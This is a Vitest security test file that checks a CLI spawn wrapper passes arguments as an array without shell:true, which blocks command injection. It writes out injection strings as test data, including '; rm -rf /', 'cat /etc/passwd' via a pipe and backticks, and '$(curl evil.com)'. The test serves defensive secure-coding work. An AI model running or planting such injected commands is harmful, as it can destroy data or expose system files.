/**
 * tests/security/spawn-injection.test.ts
 *
 * Verifies that `spawnProvider` uses array argv exclusively (never shell string).
 * Malicious inputs with shell metacharacters must be treated as literal arguments.
 *
 * Strict TDD: RED → GREEN → TRIANGULATE → REFACTOR
 */
import { describe, it, expect, vi, afterEach } from 'vitest'
import { PassThrough } from 'node:stream'

const mockSpawn = vi.fn()

vi.mock('node:child_process', () => ({
  default: { spawn: mockSpawn, fork: mockSpawn },
  spawn: mockSpawn,
  fork: mockSpawn,
  exec: mockSpawn,
  execFile: mockSpawn,
  execSync: mockSpawn,
  execFileSync: mockSpawn,
  spawnSync: mockSpawn,
  ChildProcess: class {},
}))

describe('spawnProvider — spawn injection prevention', () => {
  afterEach(() => {
    vi.clearAllMocks()
  })

  function setupMockChild() {
    const EventEmitter = require('node:events')
    const child = new EventEmitter()
    child.stdout = new PassThrough()
    child.stderr = new PassThrough()
    child.pid = 99999
    child.kill = vi.fn()
    child.send = vi.fn()
    return child
  }

  it('passes argv as an array (never shell string)', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    spawnProvider('gitleaks', ['detect', '--source', '/tmp/repo'])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    const callArgs = mockSpawn.mock.calls[0]
    expect(callArgs[0]).toBe('gitleaks')
    expect(Array.isArray(callArgs[1])).toBe(true)
    expect(callArgs[2]?.shell).toBeFalsy()
  })

  it('treats spaces as literal', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const arg = 'file name with spaces.txt'
    spawnProvider('cat', [arg])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    const argv = mockSpawn.mock.calls[0][1]
    expect(argv).toContain(arg)
    expect(argv).toHaveLength(1)
  })

  it('treats semicolons as literal', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const arg = 'file; rm -rf /'
    spawnProvider('echo', [arg])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    expect(mockSpawn.mock.calls[0][1]).toContain(arg)
  })

  it('treats pipes as literal', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const arg = '/tmp/input | cat /etc/passwd'
    spawnProvider('tool', [arg])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    expect(mockSpawn.mock.calls[0][1]).toContain(arg)
  })

  it('treats backticks as literal', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const arg = '`cat /etc/passwd`'
    spawnProvider('tool', [arg])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    expect(mockSpawn.mock.calls[0][1]).toContain(arg)
  })

  it('treats $(cmd) as literal', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const arg = '$(curl evil.com)'
    spawnProvider('tool', [arg])

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    expect(mockSpawn.mock.calls[0][1]).toContain(arg)
  })

  it('handles multiple malicious arguments', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const args = ['detect', '--source', '/safe', '--extra', '; rm -rf /', '--flag', '`whoami`']
    spawnProvider('scanner', args)

    expect(mockSpawn).toHaveBeenCalledTimes(1)
    const argv = mockSpawn.mock.calls[0][1] as string[]
    expect(argv).toHaveLength(7)
    expect(argv[4]).toBe('; rm -rf /')
    expect(argv[6]).toBe('`whoami`')
  })

  it('never passes shell:true', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const testCases = [
      { bin: 'safe', argv: ['arg'] },
      { bin: 'safe', argv: ['arg; evil'] },
      { bin: 'safe', argv: ['arg | evil'] },
      { bin: 'safe', argv: ['arg `evil`'] },
      { bin: 'safe', argv: ['arg $(evil)'] },
    ]

    for (const tc of testCases) {
      vi.clearAllMocks()
      const child = setupMockChild()
      mockSpawn.mockReturnValueOnce(child)
      spawnProvider(tc.bin, tc.argv)

      expect(mockSpawn).toHaveBeenCalledTimes(1)
      expect(mockSpawn.mock.calls[0][2]?.shell).toBeFalsy()
    }
  })

  it('stdout is exposed as async iterable', async () => {
    const { spawnProvider } = await import('@/lib/providers/cli/spawn')
    const child = setupMockChild()
    mockSpawn.mockReturnValue(child)

    const result = spawnProvider('echo', ['hello'])

    setImmediate(() => {
      child.stdout.push(Buffer.from('hello world\n'))
      child.stdout.push(null)
      child.emit('close', 0, null)
    })

    const chunks: string[] = []
    for await (const chunk of result.stdout) {
      chunks.push(chunk)
    }

    expect(chunks).toContain('hello world\n')
  })
})
